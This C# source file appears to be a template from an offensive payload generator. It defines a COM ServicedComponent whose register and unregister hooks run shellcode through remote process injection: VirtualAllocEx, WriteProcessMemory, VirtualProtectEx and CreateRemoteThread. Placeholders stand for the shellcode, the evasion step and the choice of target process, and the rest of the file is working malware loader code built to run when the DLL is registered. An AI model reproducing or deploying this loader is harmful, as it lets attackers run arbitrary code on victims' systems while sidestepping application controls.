using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.EnterpriseServices;

//####STRONG_NAME_REQUIRED####

//####INCLUDE####

//####DEFINE####

//####CODE####

namespace ComDll
{

    public class ComEDll : ServicedComponent
    {
        [ComRegisterFunction] 
        public static void DllRegisterServer(string key)
        {
            Console.WriteLine("DllRegisterServer");
            ComConDll.COMDllDo(); 
        }

        [ComUnregisterFunction] //This executes if registration fails
		public static void UnRegisterClass ( string key )
		{
            Console.WriteLine("DllUnregisterServer");
            ComConDll.COMDllDo(); 
		}
    }


    internal class ComConDll
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;

        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
            
        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;



        
        public static void COMDllDo()
        {
           
            //####EVASION####

            byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;

            //####CALL####

            //####INJECTION####
            
            // Allocate RW space for shellcode in target process
            IntPtr lpBaseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);

            // Copy shellcode to target process
            IntPtr outSize;
            WriteProcessMemory(hProcess, lpBaseAddress, buf, buf.Length, out outSize);

            // Change memory protection to executable
            uint lpflOldProtect;
            VirtualProtectEx(hProcess, lpBaseAddress, (uint)buf.Length, PageReadExecute, out lpflOldProtect);

            // Create remote thread in target process
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);


        }
    }
}
